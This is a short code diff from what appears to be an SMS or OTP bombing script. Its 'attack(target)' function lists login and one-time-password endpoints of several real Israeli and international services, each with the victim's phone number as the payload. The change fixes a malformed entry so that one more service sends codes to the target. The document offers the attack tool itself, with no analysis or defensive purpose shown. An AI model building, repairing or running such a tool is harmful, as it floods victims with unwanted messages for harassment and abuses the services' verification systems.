@@ -24,7 +24,7 @@ def attack(target):
         {"u": "https://api.yellow.co.il/v1/auth/login", "d": {"phone": target}},
         {"u": "https://wolt.com/api/v1/user/check_phone_number", "d": {"phone_number": target}},
         {"u": "https://ksp.co.il/api/v1/auth/otp", "d": {"phone": target}}
-       {"u":  "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send": {"phoneNumber": target}},
+       {"u":  "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target}},
     {
             "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email", 
             "d": {
